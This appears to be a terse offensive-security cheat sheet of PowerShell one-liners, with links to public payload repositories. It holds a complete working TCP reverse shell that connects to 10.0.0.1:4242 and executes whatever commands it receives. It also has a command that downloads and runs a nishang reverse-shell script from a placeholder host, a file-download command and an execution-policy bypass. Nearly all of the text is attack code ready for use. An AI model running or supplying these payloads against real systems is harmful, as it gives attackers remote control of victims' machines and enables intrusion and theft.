```
powershell -ExecutionPolicy Bypass -File script.ps1
```

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

```
powershell iex(New-Object Net.WebClient).DownloadString('http://ip/Invoke-PowerShellTcp.ps1');
```

```
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ip/filename.ext','C:\filelocation\filename.ext')"
```



